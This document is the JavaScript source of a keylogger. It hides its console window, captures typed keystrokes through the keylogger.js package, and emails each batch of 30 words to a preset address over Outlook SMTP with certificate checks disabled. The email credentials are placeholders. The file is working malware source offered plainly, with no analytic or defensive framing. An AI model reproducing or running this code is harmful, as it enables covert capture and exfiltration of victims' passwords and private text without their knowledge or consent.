const ConsoleWindow = require("node-hide-console-window");
const MAX_WORDS = 30
var word = new String()
var text = new String()
var nwords = 0
var i = 0

// Words not to log
const Tab = "Tab"
const Spacebar = "Spacebar"
const Enter = "Enter"
const Escape = "Escape"
const Shift = "Shift"

//To hide your console just call:
ConsoleWindow.hideConsole();

// Data for sending the email
const userEmail = "xxx" 
const passUser = "xxx" 
const toEmail = "xxx" 

async function sendEMail(message){

    var nodemailer = require('nodemailer');

    // hotmail here but you can use what you want..
    const transporter = nodemailer.createTransport({
        host: 'smtp-mail.outlook.com',       
        auth: {
            user: userEmail,
            pass: passUser
        },
        tls : { rejectUnauthorized: false }
    });

    try{
        await transporter.sendMail({
            from: userEmail,
            to: toEmail,
            subject: 'Testo',
            text: message
        });
    }catch(e){
        console.log(e)
    };
}

keylogger= require('keylogger.js');
keylogger.start(async (key) => {

    if(key != Spacebar){
        if(i==0){
            if(key!=Tab && key!=Enter && key!=Escape && key!=Shift){
                word += key
            }
            i=1
        }else{
            i=0
        }
    }else{
        nwords += 1
        text += word
        text += " "
        word = ""
        if(nwords == MAX_WORDS){
            await sendEMail(text)
            text = ''
            nwords = 0
        }
    }
    
});
